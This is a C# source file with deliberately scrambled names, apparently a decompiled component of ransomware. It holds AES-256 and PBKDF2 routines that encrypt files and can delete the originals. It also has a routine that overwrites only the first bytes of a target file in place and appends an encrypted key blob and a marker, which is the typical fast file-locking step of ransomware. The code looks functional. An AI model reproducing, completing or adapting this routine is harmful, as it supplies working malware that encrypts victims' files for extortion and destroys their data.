using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace YXHSMjloYIX;

public static class UMuLPfDIPbk
{
	public const int FbMUdhhkVxsrApk = 256;

	public static byte[] ybShRXAYKKQzn(int lHugwhTufDd)
	{
		byte[] array = new byte[lHugwhTufDd];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool YQwAblMkwWXs(string xySnMBtyXAv, byte[] VASUpuuVuO, bool xBcMQZSFJHilYSu)
	{
		byte[] array = ybShRXAYKKQzn(16);
		using FileStream fileStream = new FileStream(xySnMBtyXAv + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = VmRpQwDAHNmQE(VASUpuuVuO, array);
		VASUpuuVuO = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(xySnMBtyXAv, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (xBcMQZSFJHilYSu)
			{
				File.Delete(xySnMBtyXAv);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool FlClakdzvAiIUNc(string TPoUfbStDTHg, byte[] bCGXYSyejLfYA, bool KsOdvDOBeEqmMQW)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(TPoUfbStDTHg, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = VmRpQwDAHNmQE(bCGXYSyejLfYA, array);
		bCGXYSyejLfYA = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(TPoUfbStDTHg.Remove(TPoUfbStDTHg.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] cbzUtQrNiJp(byte[] jGoBplVQShFVC, byte[] zSpBDOJfQd, byte[] UtXKzHqjkerN)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = VmRpQwDAHNmQE(zSpBDOJfQd, UtXKzHqjkerN);
		zSpBDOJfQd = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(jGoBplVQShFVC, 0, jGoBplVQShFVC.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] nQcPfRURjdjRZ(byte[] pCFozIIoJKZZxaOR, byte[] iCXTZGcSra, byte[] PpbKFFSIcBf)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = VmRpQwDAHNmQE(iCXTZGcSra, PpbKFFSIcBf);
		iCXTZGcSra = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(pCFozIIoJKZZxaOR, 0, pCFozIIoJKZZxaOR.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool yMnYlGGpFVE(byte[] PtOfpctXqUyqQ, byte[] pkDFqTabHOMzBY, byte[] yxljGMiMahlmyj)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = VmRpQwDAHNmQE(PtOfpctXqUyqQ, pkDFqTabHOMzBY);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(yxljGMiMahlmyj);
	}

	public static Rfc2898DeriveBytes VmRpQwDAHNmQE(byte[] SkFvZFNdTWppU, byte[] VgMwIBVppf)
	{
		return new Rfc2898DeriveBytes(SkFvZFNdTWppU, VgMwIBVppf, 52768);
	}

	public static byte[] fVqAzfnOgclWqh(string MliuozWiKJdgr, int WwnBFyHdGYhV)
	{
		byte[] array = new byte[WwnBFyHdGYhV];
		try
		{
			if (zkwozuPRYYOVZ.tdXPfZPVhETfyt == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(MliuozWiKJdgr, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, WwnBFyHdGYhV);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(MliuozWiKJdgr, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, WwnBFyHdGYhV);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (zkwozuPRYYOVZ.zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(zkwozuPRYYOVZ.AycWHRRkQAZMoSL, "File: " + MliuozWiKJdgr + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(MliuozWiKJdgr, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, WwnBFyHdGYhV);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void mSMdqwRUXGu(string MmblxfahxxCq, byte[] NciqQhSWbfClU, byte[] DrFOiocWmftuTC = null)
	{
		try
		{
			byte[] array = null;
			if (zkwozuPRYYOVZ.tdXPfZPVhETfyt == "YES")
			{
				array = (zkwozuPRYYOVZ.TiYWIzCfNH ? Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==")) : Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(MmblxfahxxCq, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(NciqQhSWbfClU, 0, NciqQhSWbfClU.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(MmblxfahxxCq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!zkwozuPRYYOVZ.TiYWIzCfNH)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(DrFOiocWmftuTC, 0, DrFOiocWmftuTC.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (zkwozuPRYYOVZ.TiYWIzCfNH ? Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==")) : Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==")));
			FileStream fileStream2 = new FileStream(MmblxfahxxCq, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(NciqQhSWbfClU, 0, NciqQhSWbfClU.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(MmblxfahxxCq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!zkwozuPRYYOVZ.TiYWIzCfNH)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(DrFOiocWmftuTC, 0, DrFOiocWmftuTC.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (zkwozuPRYYOVZ.zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(zkwozuPRYYOVZ.AycWHRRkQAZMoSL, "File: " + MmblxfahxxCq + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (zkwozuPRYYOVZ.TiYWIzCfNH ? Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("Kw==")) : Encoding.ASCII.GetBytes(zkwozuPRYYOVZ.bxMeQFfPcma(zkwozuPRYYOVZ.dwsxmebtOkGolRT) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==") + Convert.ToString(zkwozuPRYYOVZ.RZwhptcFPa) + zkwozuPRYYOVZ.bxMeQFfPcma("LQ==")));
			FileStream fileStream4 = new FileStream(MmblxfahxxCq, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(NciqQhSWbfClU, 0, NciqQhSWbfClU.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(MmblxfahxxCq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!zkwozuPRYYOVZ.TiYWIzCfNH)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(DrFOiocWmftuTC, 0, DrFOiocWmftuTC.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}
}
